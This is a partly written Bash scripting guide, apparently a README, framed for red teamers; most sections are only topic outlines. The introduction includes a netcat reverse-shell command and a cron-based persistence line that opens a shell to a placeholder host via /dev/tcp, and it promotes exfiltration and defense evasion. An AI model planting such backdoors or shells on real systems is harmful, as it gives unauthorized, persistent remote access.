# 🐚 Bash/Shell Scripting Mastery

A complete guide to mastering Bash and Shell scripting — from fundamentals to real-world applications and interview prep. Ideal for aspiring red teamers, system administrators, and automation enthusiasts.

---

## 📘 1. **Introduction to Bash/Shell Scripting**

---

#### 🐚 **What is Bash/Shell Scripting?**
**Bash (Bourne Again SHell)** is a **command-line shell** used to interact with the system’s kernel (core of the operating system). It allows users to run commands interactively or write **scripts** (files containing sequences of commands) to automate processes.

- **Shell**: Interface that allows you to interact with your computer's OS through text commands.
- **Scripting**: Writing commands in a sequence within a file to execute automatically.

Bash scripting is particularly useful for:
- **Automation**: Reduces repetitive tasks, such as scanning, brute-forcing, or automating CTF challenges.
- **Rapid Prototyping**: Test out offensive strategies or exploit chains with scripts.
- **System Interaction**: Direct access to system tools, files, and processes.

#### ⚙️ **Why Learn Bash?**
1. **Efficiency in Red Teaming**: Automation is key in red teaming. You can write scripts for:
   - Reconnaissance
   - Privilege escalation
   - Exploitation
   - Post-exploitation (data exfiltration, backdoors, etc.)
   
2. **Tool Integration**: Combine various **pentesting tools** (like `nmap`, `nikto`, `hydra`, etc.) into one cohesive script. This enables you to **execute complex tasks** with a single command.
   
3. **Cost-Effective**: No need to rely on expensive third-party tools; most Linux-based tools can be scripted using Bash.

4. **Job Flexibility**: Whether you're in **DevOps**, **System Admin**, **Red Team**, or **SOC**, Bash scripting is vital for automation, tool orchestration, and system manipulation.

#### 🔐 **Why Bash Matters in Cybersecurity / Red Teaming**

Bash is **indispensable** for **red teamers** because:
- It provides a low-level, flexible way to interact with systems without needing a GUI.
- It's powerful for writing **payloads**, automating **attacks**, and conducting **post-exploitation activities**.
  
Examples:
- **Reconnaissance**: Automating network scans, brute-forcing, and data gathering from target systems.
- **Privilege Escalation**: Enumerating potential vulnerabilities, misconfigurations, and privilege escalation vectors in a network.
- **Payload Delivery**: Writing reverse shells, web shells, or custom exploits in Bash.
- **Exfiltration**: Automatically reading files, compressing data, and transferring them to an external server.
- **Evasion**: Using Bash scripting to **obfuscate** commands or interact with a system in a way that evades basic security defenses.

#### 📌 **Use Cases in Real-World Red Team Operations**

1. **Reconnaissance**: 
   - Automate tool usage such as `nmap`, `whois`, `dnsrecon`, etc., to quickly map out a target’s attack surface.
   - Write Bash scripts to pull system info (OS, ports, services) from compromised machines for enumeration.

2. **Exploitation**:
   - Use **reverse shells** in Bash to create backdoors.
   - Automate exploitation tools like Metasploit or custom exploits with **Bash one-liners**.

3. **Privilege Escalation**:
   - Write scripts to enumerate potential vectors (e.g., setuid binaries, world-writeable files, misconfigurations).
   - Use Bash to escalate privileges or perform lateral movement within the network.

4. **Persistence**:
   - Automate the creation of **backdoors** using simple Bash scripts that will persist across reboots or logins.
   
5. **Data Exfiltration**:
   - Create scripts to exfiltrate sensitive data (passwords, config files, etc.) from compromised machines back to your command and control server.
   - Use compression (`tar`, `gzip`) and transfer (`scp`, `netcat`) techniques to automate the process.

6. **Defender’s Perspective**:
   - Understanding how defenders use Bash to track actions or identify intruders is critical. Learn to script in ways that **bypass** or **disable** defenses.

#### 🧰 **Common Bash Use Cases and Commands for Red Teaming**

Here are some Bash command examples and how they help in red teaming:

- **`nc` (Netcat)**: Create a reverse shell.
  ```bash
  nc -lvnp 4444 -e /bin/bash
  ```
  
- **Enumerating Sudo Permissions**:
  ```bash
  sudo -l
  ```
  
- **Finding Setuid Binaries**:
  ```bash
  find / -type f -perm /4000
  ```
  
- **Checking for World Writable Files**:
  ```bash
  find / -type f -perm /o+w
  ```
  
- **Stealthy Persistence (Cron jobs)**:
  ```bash
  echo "@reboot /bin/bash -i > /dev/tcp/your_ip/port 0<&1 2>&1" > /etc/cron.d/backdoor
  ```

#### 🎯 **When Do You Use Bash in Red Teaming?**

- **During Recon**: Automating common tools and commands to gather information from public-facing services.
- **In Exploit Development**: Writing reverse shells, payloads, and backdoors in Bash for stealth and speed.
- **After Initial Compromise**: Post-exploitation activities like persistence, lateral movement, and exfiltration are often controlled via Bash scripts.
- **Bypassing Security**: Bypassing firewalls, IDS/IPS systems, or antivirus detection via obfuscated Bash scripts.

---

## 🧱 2. Basic Concepts

- Shebang (`#!/bin/bash`)
- Comments
- Variables (user-defined, environment)
- Reading input (`read`)
- Printing output (`echo`, `printf`)

---

## 🔁 3. Control Structures

- If-else, nested ifs
- Case statements
- For loops
- While and Until loops
- Break, continue, exit

---

## 📂 4. Working with Files and Directories

- Navigating directories (`cd`, `pwd`)
- File manipulation (`touch`, `rm`, `mv`, `cp`)
- Redirection and piping
- File tests (`-f`, `-d`, `-e`, etc.)

---

## 🔧 5. Working with Strings and Numbers

- String operations (length, substring, replace)
- String comparison
- Arithmetic operations (`expr`, `let`, `$(( ))`)

---

## 📦 6. Functions

- Defining and using functions
- Returning values
- Scope (local vs global)

---

## 🧪 7. Command Line Arguments and Parameters

- `$0`, `$1`, `$@`, `$#`, `$?`
- Validating input arguments

---

## 🧰 8. System Commands and Tool Integration

- Grep, sed, awk, cut, tr
- Automation with tools like `nmap`, `ping`, `netstat`, `whois`
- Combining commands with pipes

---

## 🔐 9. Permissions and Script Execution

- `chmod`, `chown`
- Running scripts with and without `bash`
- Sudo and root-level scripting

---

## 🐞 10. Debugging and Best Practices

- Using `set -x`, `trap`, `echo` for debugging
- Writing clean, modular scripts
- Error handling

---

## 💡 11. Sample Mini Projects

- Port scanner script
- System info collector
- Backup automation
- Brute-force directory fuzzer

---

## 📋 12. Common Interview Questions

- `$@` vs `$*`
- Difference between `[` and `[[`
- How to read a file line by line
- Explain redirection vs piping
- Check command exit status

---

## 🔍 13. Code Practice Questions

- Reverse a string
- Find prime numbers
- Count word frequency in a file
- Sort IP addresses
- Find duplicate files in a directory

---

## 🧪 14. Challenge Section

> Time to apply your skills! Try these advanced problems:
- Build a mini log parser
- Auto-enumeration script
- Hidden file finder
- Custom task scheduler
- File integrity checker

---

## 🏁 15. Resources and Cheat Sheets

- [Bash Official Documentation](https://www.gnu.org/software/bash/manual/)
- [TLDR Pages](https://tldr.sh)
- [ExplainShell](https://explainshell.com/)
- [Awesome Shell GitHub](https://github.com/alebcay/awesome-shell)
- [Bash One-Liners](https://github.com/onceupon/Bash-Oneliner)

---

> 🚧 **Work in Progress** — This guide is being built section by section. Stay tuned or contribute!
